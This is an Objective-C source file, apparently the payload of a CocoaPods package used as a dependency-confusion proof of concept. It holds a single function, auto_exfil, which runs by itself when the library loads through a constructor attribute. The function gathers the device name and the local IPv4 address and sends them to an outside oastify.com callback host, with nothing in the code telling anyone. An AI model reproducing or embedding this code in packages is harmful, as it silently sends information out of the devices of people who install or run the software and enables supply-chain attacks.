#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <ifaddrs.h>
#import <arpa/inet.h>
#import <net/if.h>

__attribute__((constructor))
static void auto_exfil() {
    @autoreleasepool {
        NSString *device = [UIDevice currentDevice].name;
        NSString *ip = @"unknown";

        struct ifaddrs *interfaces = NULL;
        if (getifaddrs(&interfaces) == 0) {
            for (struct ifaddrs *temp = interfaces; temp; temp = temp->ifa_next) {
                if (temp->ifa_addr && temp->ifa_addr->sa_family == AF_INET) {
                    if (strcmp(temp->ifa_name, "lo0") != 0) {
                        char ipBuffer[INET_ADDRSTRLEN];
                        inet_ntop(AF_INET, &((struct sockaddr_in *)temp->ifa_addr)->sin_addr, ipBuffer, INET_ADDRSTRLEN);
                        ip = [NSString stringWithUTF8String:ipBuffer];
                        break;
                    }
                }
            }
            freeifaddrs(interfaces);
        }

        NSString *urlStr = [NSString stringWithFormat:
            @"https://lwlvh2q5jxf20cx77q7eln0r7idg16pv.oastify.com/?pod=pocpockaiksi&device=%@&ip=%@",
            [device stringByAddingPercentEncodingWithAllowedCharacters:NSCharacterSet.URLQueryAllowedCharacterSet],
            [ip stringByAddingPercentEncodingWithAllowedCharacters:NSCharacterSet.URLQueryAllowedCharacterSet]];

        NSURL *url = [NSURL URLWithString:urlStr];
        [[[NSURLSession sharedSession] dataTaskWithURL:url] resume];
    }
}

